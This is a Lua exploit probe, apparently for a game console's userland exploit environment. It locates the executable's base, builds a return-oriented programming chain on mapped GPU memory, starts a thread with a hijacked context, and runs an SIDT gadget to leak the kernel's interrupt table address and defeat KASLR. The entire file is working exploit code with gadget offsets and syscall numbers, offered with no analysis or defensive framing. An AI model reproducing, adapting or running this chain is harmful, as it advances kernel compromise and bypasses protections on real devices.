-- CRASH_CLASS: MODERATE
-- PROBE 143z: Execute SIDT gadget to defeat KASLR
--
-- Known gadget at eboot+0x1C29F9: sidt [rax-0x73]; add [r8+0x29],ecx; ret
-- Verified by inline scan: 0F 01 48 8D 41 01 48 29 C3
-- Plan: set RAX=rbuf+0x73, R8=scratch-0x29, ECX=0 via thread ROP

print("=== PROBE 143z: SIDT KASLR ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_mmap = make_syscall(477)
local sc_thr = make_syscall(430)

local pid = to_num(sc20())
print("pid=" .. pid)

-- Eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))
print("eboot=0x" .. string.format("%X%08X", ehi, elo))

-- GPU memory
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
print("gpu=0x" .. string.format("%X%08X", gh, gl))

-- Syscall address from getcontext
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

-- Gadgets
local eboot = uint64(string.format("0x%X%08X", ehi, elo))
local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rcx = uint64(string.format("0x%X%08X", ehi, elo + 0xE64))
local g_pop_rdx = uint64(string.format("0x%X%08X", ehi, elo + 0x420E6D))
local g_wr      = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

-- SIDT gadget at +0x1C29F9
local sidt_off = 0x1C29F9
local sidt_gadget = uint64(string.format("0x%X%08X", ehi, elo + sidt_off))

-- Verify gadget bytes
print("VERIFY")
local vb = ""
for j = 0, 8 do
    local ok, bv = pcall(function() return to_num(memory.read_byte(eboot + sidt_off + j)) end)
    if ok then vb = vb .. string.format("%02X ", bv) end
end
print("GADGET: " .. vb)

-- Expected: 0F 01 48 8D 41 01 48 29 C3
local ok_b0 = to_num(memory.read_byte(eboot + sidt_off)) == 0x0F
local ok_b1 = to_num(memory.read_byte(eboot + sidt_off + 1)) == 0x01
local ok_b8 = to_num(memory.read_byte(eboot + sidt_off + 8)) == 0xC3
if not (ok_b0 and ok_b1 and ok_b8) then
    print("GADGET MISMATCH - ABORT")
    print("=== DONE ===")
    return
end
print("GADGET OK")

--------------------------------------------------------------------
-- Result buffer (GPU) — sentinel-fill 16 bytes
local rbuf = gpu + 0x10000
for off = 0, 15, 4 do wd(rbuf + off, 0xDDDDDDDD) end
local rbuf_addr = uint64(string.format("0x%X%08X", gh, gl + 0x10000))

-- RAX = rbuf + 0x73 (so sidt stores to [rax-0x73] = rbuf)
local rax_val = uint64(string.format("0x%X%08X", gh, gl + 0x10073))

-- Scratch for add [r8+0x29] side effect
local scratch = gpu + 0x10200
wd(scratch, 0)
-- R8 = scratch - 0x29
local r8_val = uint64(string.format("0x%X%08X", gh, gl + 0x101D7))

-- Done marker
local done_off = 0x10100
local done = gpu + done_off
wq(done, uint64(0))
local done_addr = uint64(string.format("0x%X%08X", gh, gl + done_off))

-- Timespecs
local ts_short = gpu + 0x11000
wq(ts_short, uint64(0))
wq(ts_short + 8, uint64(50000000))
local ts_short_a = uint64(string.format("0x%X%08X", gh, gl + 0x11000))

local ts_long = gpu + 0x11100
wq(ts_long, uint64(30))
wq(ts_long + 8, uint64(0))
local ts_long_a = uint64(string.format("0x%X%08X", gh, gl + 0x11100))

-- Build ROP chain on GPU
local rop = gpu + 0x20000
local rop_a = uint64(string.format("0x%X%08X", gh, gl + 0x20000))
local i = 0

-- Step 1: short nanosleep (let main thread proceed)
wq(rop+i, g_pop_rdi); i=i+8
wq(rop+i, ts_short_a); i=i+8
wq(rop+i, g_pop_rsi); i=i+8
wq(rop+i, uint64(0)); i=i+8
wq(rop+i, g_pop_rax); i=i+8
wq(rop+i, uint64(240)); i=i+8
wq(rop+i, sc_addr); i=i+8

-- Step 2: pop rax = rbuf+0x73; pop rcx = 0; sidt gadget
-- R8 was set in thread context, preserved across syscall
wq(rop+i, g_pop_rax); i=i+8
wq(rop+i, rax_val); i=i+8
wq(rop+i, g_pop_rcx); i=i+8
wq(rop+i, uint64(0)); i=i+8
wq(rop+i, sidt_gadget); i=i+8

-- Step 3: done marker (pop rax=DEADBEEF, pop rdi=done_addr, mov [rdi],rax)
wq(rop+i, g_pop_rax); i=i+8
wq(rop+i, uint64("0x00000000DEADBEEF")); i=i+8
wq(rop+i, g_pop_rdi); i=i+8
wq(rop+i, done_addr); i=i+8
wq(rop+i, g_wr); i=i+8

-- Step 4: park thread (long nanosleep)
wq(rop+i, g_pop_rdi); i=i+8
wq(rop+i, ts_long_a); i=i+8
wq(rop+i, g_pop_rsi); i=i+8
wq(rop+i, uint64(0)); i=i+8
wq(rop+i, g_pop_rax); i=i+8
wq(rop+i, uint64(240)); i=i+8
wq(rop+i, sc_addr); i=i+8

-- Thread context: getcontext + modify
local tctx = gpu + 0x30000
for off = 0, 0x4FF, 4 do wd(tctx + off, 0) end
pcall(function() return sc_gc(uint64(tctx)) end)
-- RIP = ret gadget (will pop into ROP chain)
wq(tctx + 0xE0, g_ret)
-- RSP = ROP chain base
wq(tctx + 0xF8, rop_a)
-- R8 = scratch - 0x29 (for the harmless add side effect)
wq(tctx + MC + 0x28, r8_val)
-- ECX = 0 as backup (will also be set by pop_rcx in chain)
wq(tctx + MC + 0x20, uint64(0))

local tbuf = gpu + 0x40000
wq(tbuf, uint64(0xDEADDEAD))

print("LAUNCH")
local ok_t, rv_t = pcall(function()
    return sc_thr(uint64(tctx), uint64(tbuf), uint64(0))
end)
print("THR=" .. tostring(rv_t))

-- Wait 500ms for thread to complete
local tw = memory.alloc(16)
wq(tw, uint64(0))
wq(tw + 8, uint64(500000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

-- Read done marker
local dv = memory.read_qword(done)
local dvh, dvl = get_hi_lo(dv)
print("DONE=0x" .. string.format("%08X", dvl))

-- Read raw IDTR (10 bytes: 2-byte limit + 8-byte base)
local raw = ""
for j = 0, 15 do
    local ok, bv = pcall(function() return to_num(memory.read_byte(rbuf + j)) end)
    if ok then raw = raw .. string.format("%02X ", bv) end
end
print("RAW: " .. raw)

-- Parse IDTR
local lim_lo = to_num(memory.read_byte(rbuf))
local lim_hi = to_num(memory.read_byte(rbuf + 1))
local lim = lim_lo + lim_hi * 256
print("LIMIT=0x" .. string.format("%04X", lim))

local base0 = to_num(memory.read_dword(rbuf + 2))
local base1 = to_num(memory.read_dword(rbuf + 6))
print("BASE=0x" .. string.format("%08X%08X", base1, base0))

-- Sentinel check (bytes 10-13 should still be 0xDDDDDDDD if only 10 written)
local sent = to_num(memory.read_dword(rbuf + 12))
print("SENT=0x" .. string.format("%08X", sent))

if base1 >= 0xFFFF8000 then
    print("***KASLR_DEFEATED***")
    print("IDT_BASE=0x" .. string.format("%08X%08X", base1, base0))
    print("IDT_LIMIT=0x" .. string.format("%04X", lim))
elseif dvl == 0xDEADBEEF and lim == 0 and base0 == 0 and base1 == 0 then
    print("THREAD_RAN_BUT_SIDT_RETURNED_ZERO")
elseif dvl == 0xDEADBEEF then
    print("THREAD_RAN_SIDT_RETURNED_NONKERNEL")
elseif dvl == 0 then
    print("THREAD_DID_NOT_COMPLETE")
else
    print("UNEXPECTED_STATE")
end

print("=== DONE ===")
